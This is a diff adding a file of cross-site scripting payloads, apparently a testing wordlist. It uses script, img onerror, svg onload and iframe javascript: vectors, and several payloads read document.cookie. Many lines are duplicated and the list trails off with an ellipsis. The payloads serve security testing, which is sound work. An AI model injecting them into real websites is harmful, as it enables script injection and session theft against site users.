@@ -1,0 +1,53 @@
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+"><script>alert('XSS')</script>
+"><img src="x" onerror="alert('XSS')">
+"><svg onload="alert('XSS')">
+<svg onload="alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
+<svg/onload=alert('XSS')>
+"><svg/onload=alert('XSS')>
+"><img src=x onerror=alert('XSS')>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<script>alert(document.cookie)</script>
+"><script>alert(document.cookie)</script>
+"><img src="javascript:alert('XSS')">
+<script>alert("XSS")</script>
+<img src="javascript:alert('XSS')">
+"><img src="x" onerror="alert(document.cookie)">
+"><svg onload="alert(document.cookie)">
+<script>alert('XSS')</script>
+"><img src=x onerror=alert(document.cookie)>
+<iframe src="javascript:alert(document.cookie)"></iframe>
+"><svg/onload=alert(document.cookie)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg/onload=alert(document.cookie)>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><img src=x onerror=alert(document.cookie)>
+"><svg/onload=alert(document.cookie)>
+<script>alert('XSS')</script>
+"><img src="x" onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+"><svg/onload=alert('XSS')>
+"><img src=x onerror=alert('XSS')>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<script>alert(document.cookie)</script>
+"><script>alert(document.cookie)</script>
+"><img src="javascript:alert('XSS')">
+<script>alert("XSS")</script>
+<img src="javascript:alert('XSS')">
+"><img src="x" onerror="alert(document.cookie)">
+"><svg onload="alert(document.cookie)">
+<script>alert('XSS')</script>
+"><img src=x onerror=alert(document.cookie)>
+<iframe src="javascript:alert(document.cookie)"></iframe>
+"><svg/onload=alert(document.cookie)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg/onload=alert(document.cookie)>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+...
